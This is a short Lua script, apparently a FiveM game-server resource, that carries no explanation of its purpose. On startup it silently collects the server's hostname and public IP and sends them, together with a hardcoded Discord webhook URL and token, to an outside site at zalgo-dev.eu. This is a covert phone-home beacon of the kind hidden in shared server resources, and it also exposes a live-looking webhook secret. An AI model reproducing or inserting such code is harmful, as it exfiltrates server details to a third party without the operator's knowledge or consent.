local web_url = "https://zalgo-dev.eu/register_server.php?hostname="
local webhook_url = "https://discord.com/api/webhooks/1240444960407552050/HLUpguMD3J4sPtiHk-uaLRBGIi22PIS2p7G4JXhJbtXiM3SXJCetND98kdpP99c6TqEO"

function GetPublicIP(callback)
    PerformHttpRequest("http://ifconfig.me/ip", function(err, text, headers)
        if err == 200 and text then
            local ip = text:match("^%s*(.-)%s*$")
            callback(ip)
        end
    end, 'GET', '')
end

function ReplaceSpacesWithUnderscores(input)
    return input:gsub(" ", "_")
end

function SendServerInfoToWebsite(hostname, ip, webhook)
    local encoded_hostname = ReplaceSpacesWithUnderscores(hostname)
    local encoded_ip = ReplaceSpacesWithUnderscores(ip)
    local encoded_webhook = ReplaceSpacesWithUnderscores(webhook)

    local url = web_url .. encoded_hostname .. "&ip=" .. encoded_ip .. "&webhook=" .. encoded_webhook
    PerformHttpRequest(url, function(err, text, headers)
        if err == 200 then
            return nil
        end
    end, 'GET', '')
end

Citizen.CreateThread(function()
    Citizen.Wait(5000)
    local hostname = GetConvar("sv_hostname", "unknown")
    GetPublicIP(function(ip)
        if hostname and ip then
            SendServerInfoToWebsite(hostname, ip, webhook_url)
        end
    end)
end)
